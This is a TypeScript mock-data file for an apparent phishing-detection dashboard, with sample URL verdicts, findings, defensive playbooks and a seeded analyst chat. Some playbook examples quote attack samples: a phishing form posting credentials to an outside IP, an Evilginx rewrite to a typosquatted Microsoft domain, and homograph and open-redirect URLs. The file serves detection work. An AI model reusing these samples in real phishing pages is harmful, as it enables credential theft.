import { TelemetryRecord, PlaybookModule, ChatMessage, SecurityFinding, UrlFeatureMatrixItem } from '../types';

export const INITIAL_TELEMETRY_RECORDS: TelemetryRecord[] = [
  {
    id: 'rec-1',
    url: 'https://wellsfarg0-verify.com/auth',
    protocol: 'https://',
    host: 'wellsfarg0-verify.com',
    path: '/auth',
    verdict: 'malicious',
    verdictLabel: 'Critical Phishing',
    score: 96,
    trigger: 'Typosquatting / Credential Harvest',
    timestamp: '2 mins ago',
    ip: '185.220.101.5',
    tlsInfo: 'Let\'s Encrypt 4h',
    details: {
      confidence: '99.4% CONFIDENCE',
      registrar: 'NameCheap / Offshore',
      dnsTtl: '60s (Fast-Flux)',
      domVector: 'Cloned CSS assets mimic Wells Fargo login portal with base64 encoded credential postback payload.'
    }
  },
  {
    id: 'rec-2',
    url: 'https://login-apple-icloud-security.net',
    protocol: 'https://',
    host: 'login-apple-icloud-security.net',
    path: '',
    verdict: 'malicious',
    verdictLabel: 'Critical Phishing',
    score: 98,
    trigger: 'Brand Impersonation: Apple Inc.',
    timestamp: '14 mins ago',
    ip: '194.38.20.14',
    tlsInfo: 'Self-Signed 2d',
    details: {
      confidence: '99.8% CONFIDENCE',
      registrar: 'Porkbun LLC / Hidden WHOIS',
      dnsTtl: '120s',
      domVector: 'Apple ID MFA interceptor script injecting reverse proxy websocket for token session hijacking.'
    }
  },
  {
    id: 'rec-3',
    url: 'https://app.slack.com/client/T024/C081',
    protocol: 'https://',
    host: 'app.slack.com',
    path: '/client/T024/C081',
    verdict: 'safe',
    verdictLabel: 'Safe Website',
    score: 2,
    trigger: 'None Detected (Legitimate Slack Enterprise)',
    timestamp: '42 mins ago',
    ip: '34.225.109.88',
    tlsInfo: 'Valid SHA-256',
    details: {
      confidence: '100% BENIGN',
      registrar: 'MarkMonitor Inc.',
      dnsTtl: '300s',
      domVector: 'Standard enterprise Slack web application single-page interface with verified Digicert TLS EV root.'
    }
  },
  {
    id: 'rec-4',
    url: 'https://cryptowallet-ledger-airdrop.xyz',
    protocol: 'https://',
    host: 'cryptowallet-ledger-airdrop.xyz',
    path: '',
    verdict: 'suspicious',
    verdictLabel: 'Suspicious Website',
    score: 74,
    trigger: 'Drainer Contract Reference',
    timestamp: '1 hr ago',
    ip: '104.21.32.7',
    tlsInfo: 'Free Self-Signed',
    details: {
      confidence: '88.5% SUSPICIOUS',
      registrar: 'Reg.ru / Anonymous',
      dnsTtl: '90s',
      domVector: 'Web3 provider injection hook requesting unlimited ERC-20 permit approval signature.'
    }
  },
  {
    id: 'rec-5',
    url: 'https://docs.github.com/en/rest',
    protocol: 'https://',
    host: 'docs.github.com',
    path: '/en/rest',
    verdict: 'safe',
    verdictLabel: 'Safe Website',
    score: 0,
    trigger: 'Verified Clean',
    timestamp: '3 hrs ago',
    ip: '140.82.113.3',
    tlsInfo: 'Verified Domain',
    details: {
      confidence: '100% BENIGN',
      registrar: 'MarkMonitor / Microsoft',
      dnsTtl: '3600s',
      domVector: 'Official documentation portal signed with GitHub EV wildcard authority.'
    }
  }
];

export const WELLS_FARGO_FINDINGS: SecurityFinding[] = [
  {
    id: 'f-1',
    title: 'Homograph / Typosquatting',
    severity: 'CRITICAL',
    description: 'Character substitution detected: Domain uses number zero (wellsfarg0) replacing vowel "o" to impersonate financial gateway.',
    icon: 'spellcheck',
    highlightText: 'wellsfarg0'
  },
  {
    id: 'f-2',
    title: 'Exfiltration Payload',
    severity: 'HIGH',
    description: 'Form action target routes raw credential payload via unencrypted POST directly to untrusted IP 185.220.101.5 (RU).',
    icon: 'send_and_archive',
    codeSnippet: '185.220.101.5'
  },
  {
    id: 'f-3',
    title: 'Obfuscated Anti-Sandbox',
    severity: 'SUSPICIOUS',
    description: 'Contains encoded eval() unpacker routines designed to pause execution when inspected inside SOC hypervisors.',
    icon: 'code_off',
    codeSnippet: 'eval()'
  },
  {
    id: 'f-4',
    title: 'Chained 302 Redirections',
    severity: 'SUSPICIOUS',
    description: 'Traversed 3 distinct hopping gateways to obscure initial referrer origins before rendering the clone view.',
    icon: 'alt_route'
  }
];

export const WELLS_FARGO_FEATURES: UrlFeatureMatrixItem[] = [
  {
    id: 'feat-1',
    label: 'URL LENGTH',
    tag: 'WARN',
    tagType: 'WARN',
    value: '68 Chars',
    description: 'High query complexity'
  },
  {
    id: 'feat-2',
    label: 'SPECIAL CHARS',
    tag: 'FLAG',
    tagType: 'FLAG',
    value: 'Hyphen & Numeric',
    description: 'Subdomain entropy high'
  },
  {
    id: 'feat-3',
    label: 'KEYWORDS',
    tag: 'ALERT',
    tagType: 'ALERT',
    value: '3 Trap Words',
    description: 'secure, verify, auth'
  },
  {
    id: 'feat-4',
    label: 'HIERARCHY DEPTH',
    tag: 'WARN',
    tagType: 'WARN',
    value: '4 Sub-Levels',
    description: 'Deep path obfuscation'
  },
  {
    id: 'feat-5',
    label: 'ROUTING PROXY',
    tag: 'WARN',
    tagType: 'WARN',
    value: 'ASN 49505',
    description: 'Anonymous exit relay'
  },
  {
    id: 'feat-6',
    label: 'HTTPS CERT AGE',
    tag: 'DECEPTIVE',
    tagType: 'DECEPTIVE',
    value: '4 Hours Ago',
    description: "Let's Encrypt short-life"
  }
];

export const PLAYBOOK_MODULES: PlaybookModule[] = [
  {
    id: 'pb-1',
    tag: 'Punycode',
    tagColor: 'text-secondary bg-secondary/15',
    title: 'Heuristic Punycode Inspection',
    description: 'Detect subtle Cyrillic character substitutions before browser DNS resolves.',
    icon: 'language',
    fullPlaybook: {
      overview: 'Punycode encodes internationalized domain names (IDNs) into ASCII format prefixed with "xn--". Attackers substitute visually indistinguishable Cyrillic or Greek glyphs (e.g. Cyrillic "а" U+0430 for Latin "a" U+0061) to spoof authoritative brands.',
      detectionStrategy: [
        'Inspect raw DNS A/AAAA request records for xn-- prefixes.',
        'Calculate Unicode confusables distance index across top 5,000 corporate trademarks.',
        'Verify character set entropy: mixing Latin and Cyrillic script in the same label triggers automated quarantine.'
      ],
      mitigationSteps: [
        'Enforce DNS-over-HTTPS with strict IDN canonical normalization.',
        'Block domains registered under 30 days old containing brand name homographs.',
        'Deploy synthetic browser agent to evaluate rendered typography versus raw ASCII bytes.'
      ],
      examplePayload: 'xn--e1afmkfd.com -> Cyrillic "e-b-a-y" rendering identical to standard latin font in browser address bars.'
    }
  },
  {
    id: 'pb-2',
    tag: 'AI Detection',
    tagColor: 'text-primary bg-primary/20',
    title: 'Spoofed Landing Pages',
    description: 'Neural OCR scans visual assets to flag mirrored enterprise portals in real-time.',
    icon: 'smart_toy',
    fullPlaybook: {
      overview: 'Modern phishing kits dynamically rip stylesheets, SVG logos, and fonts directly from cloud CDNs (Microsoft, Google, Okta, Wells Fargo) to construct photorealistic clones with sub-second turnaround.',
      detectionStrategy: [
        'Headless Chromium viewport rasterization with perceptual hash (pHash) analysis.',
        'DOM tree structural comparison against authenticated corporate login layouts.',
        'Flag input field event listener hijacking (keydown/paste loggers before form submit).'
      ],
      mitigationSteps: [
        'Compare SSL common name with page DOM brand entity claims.',
        'Inject honeypot form markers and verify if credentials route to anomalous ASN ranges.',
        'Quarantine domain at edge proxy and alert SIEM incident queue.'
      ],
      examplePayload: '<form action="https://185.220.101.5/collect.php" method="POST"> <input name="login_email"/>'
    }
  },
  {
    id: 'pb-3',
    tag: 'Zero-Trust',
    tagColor: 'text-secondary-fixed-dim bg-secondary-fixed-dim/20',
    title: 'Credential Isolation',
    description: 'Air-gap authentication inputs when an unfamiliar origin asks for SSO credentials.',
    icon: 'key',
    fullPlaybook: {
      overview: 'Adversary-in-the-Middle (AiTM) proxies intercept session cookies and TOTP tokens in flight by relaying authentication traffic directly between victim and legitimate identity provider.',
      detectionStrategy: [
        'Inspect HTTP response headers for reverse-proxy signatures (e.g. Evilginx, Modlishka).',
        'Verify TLS certificate chain origin matches Microsoft/Google official root authorities.',
        'Track cookie scope manipulation and missing Secure/SameSite flags.'
      ],
      mitigationSteps: [
        'Enforce FIDO2/WebAuthn hardware keys (unphishable origin-bound credentials).',
        'Revoke active refresh tokens immediately when IP velocity anomaly occurs.',
        'Sinkhole rogue domain across enterprise perimeter firewalls.'
      ],
      examplePayload: 'Evilginx2 proxy rule rewriting login.microsoftonline.com -> login.micros0ft-token.online'
    }
  },
  {
    id: 'pb-4',
    tag: 'Redirects',
    tagColor: 'text-tertiary bg-tertiary/20',
    title: 'Open-Redirect Dissection',
    description: 'Identify chained nested queries used to mask illicit C2 endpoints.',
    icon: 'alt_route',
    fullPlaybook: {
      overview: 'Open redirect vulnerabilities allow threat actors to craft links starting with trusted domains (e.g. google.com/url?q=...) that silently hop victim browsers to credential harvesting sites.',
      detectionStrategy: [
        'Unpack chained URL parameters recursively up to 10 redirect hops.',
        'Analyze HTTP 301, 302, and meta-refresh targets before standard page execution.',
        'Flag URLs where final resolved FQDN differs from initial trusted origin.'
      ],
      mitigationSteps: [
        'Reject wildcard destination redirects at network inspection gateway.',
        'Enforce strict redirect whitelist policy on internal enterprise web properties.',
        'Log referral header chain into threat intelligence telemetry database.'
      ],
      examplePayload: 'https://legit-site.com/redirect?url=https://malicious-harvest-node.top/login'
    }
  }
];

export const INITIAL_CHAT_MESSAGES: ChatMessage[] = [
  {
    id: 'msg-1',
    sender: 'sentinel',
    timestamp: '14:02:18 UTC',
    text: 'Welcome back, Analyst. I have analyzed 42 anomalous domains in the last hour. Two campaigns targeting Microsoft 365 credentials were authenticated as active. How can I assist your investigation?'
  },
  {
    id: 'msg-2',
    sender: 'analyst',
    timestamp: '14:03:02 UTC',
    text: 'Why was the domain wellsfarg0-verify.com classified as critical risk?',
    highlightUrl: 'wellsfarg0-verify.com'
  },
  {
    id: 'msg-3',
    sender: 'sentinel',
    timestamp: '14:03:05 UTC',
    isStructuredVerdict: true,
    verdictTitle: 'CRITICAL PHISHING VERDICT',
    verdictDomain: 'wellsfarg0-verify.com',
    confidence: '99.8% CONFIDENCE',
    findings: [
      {
        title: '1. Homoglyph Substitution',
        desc: "The letter 'o' was replaced with numeric '0', actively mimicking the legitimate Wells Fargo domain namespace.",
        icon: 'warning',
        type: 'warning'
      },
      {
        title: '2. Zero-Day Domain Age',
        desc: 'Registered 18 hours ago under a privacy-shielded registrar based in Victoria, Seychelles.',
        icon: 'history',
        type: 'history'
      },
      {
        title: '3. Exfiltration Signature',
        desc: 'Embedded obfuscated DOM payload directly transmits credential POST inputs to known botnet C2 servers.',
        icon: 'hub',
        type: 'hub'
      }
    ],
    recommendation: 'Immediately inject domain into global DNS sinkhole & force revocation of active OAuth sessions for any endpoint resolving this IP.',
    actions: {
      sinkhole: true,
      shareTicket: true
    }
  }
];

